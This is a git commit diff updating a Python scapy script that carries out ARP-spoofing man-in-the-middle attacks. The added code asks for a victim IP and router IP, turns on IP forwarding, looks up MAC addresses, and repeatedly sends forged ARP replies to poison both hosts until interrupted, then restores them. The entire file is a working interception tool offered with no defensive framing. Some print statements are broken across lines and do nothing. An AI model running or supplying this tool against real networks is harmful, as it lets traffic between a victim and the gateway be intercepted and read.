a572004b13341e76b60b647b6977d8544519fa6c
Antoine Perry <antoine.ap.57@gmail.com>
2020-05-16 01:27:49 +0200

    mitm update script

--- mitm/mitm.py
+++ mitm/mitm.py
@@ -1,31 +1,79 @@
-import scapy.all as scapy
-import time
-import argparse
+from scapy.all import *
 import sys
+import os
+import time
 
-
-def spoofer(target_ip, spoof_ip):
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=destinationMac, psrc=spoof_ip)
-    scapy.send(packet, verbose=False)
-
-
-def restore(dest_ip, source_ip):
-    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=getMac(dest_ip), psrc=source_ip, hwsrc=sourceMAC)
-    scapy.send(packet, count=4, verbose=False)
-
-
-packets = 0
-targetIP = ""
-gatewayIP =""
 try:
-    while True:
-        spoofer(targetIP, gatewayIP)
-        spoofer(gatewayIP, targetIP)
-        print("\r[+] Sent packets " + str(packets)),
-        sys.stdout.flush()
-        packets += 2
-        time.sleep(2)
+    interface = raw_input("[*] Enter Desired Interface: ")
+    victimIP = raw_input("[*] Enter Victim IP: ")
+    gateIP = raw_input("[*] Enter Router IP: ")
 except KeyboardInterrupt:
-    print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
-    restore(targetIP, gatewayIP)
-    restore(gatewayIP, targetIP)
+    print
+    "\n[*] User Requested Shutdown"
+    print
+    "[*] Exiting..."
+    sys.exit(1)
+
+print
+"\n[*] Enabling IP Forwarding...\n"
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+
+def get_mac(IP):
+    conf.verb = 0
+    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
+    for snd, rcv in ans:
+        return rcv.sprintf(r"%Ether.src%")
+
+
+def reARP():
+    print
+    "\n[*] Restoring Targets..."
+    victimMAC = get_mac(victimIP)
+    gateMAC = get_mac(gateIP)
+    send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7)
+    send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateMAC), count=7)
+    print
+    "[*] Disabling IP Forwarding..."
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    print
+    "[*] Shutting Down..."
+    sys.exit(1)
+
+
+def trick(gm, vm):
+    send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst=vm))
+    send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst=gm))
+
+
+def mitm():
+    try:
+        victimMAC = get_mac(victimIP)
+    except Exception:
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+        print
+        "[!] Couldn't Find Victim MAC Address"
+        print
+        "[!] Exiting..."
+        sys.exit(1)
+    try:
+        gateMAC = get_mac(gateIP)
+    except Exception:
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+        print
+        "[!] Couldn't Find Gateway MAC Address"
+        print
+        "[!] Exiting..."
+        sys.exit(1)
+    print
+    "[*] Poisoning Targets..."
+    while 1:
+        try:
+            trick(gateMAC, victimMAC)
+            time.sleep(1.5)
+        except KeyboardInterrupt:
+            reARP()
+            break
+
+
+mitm()
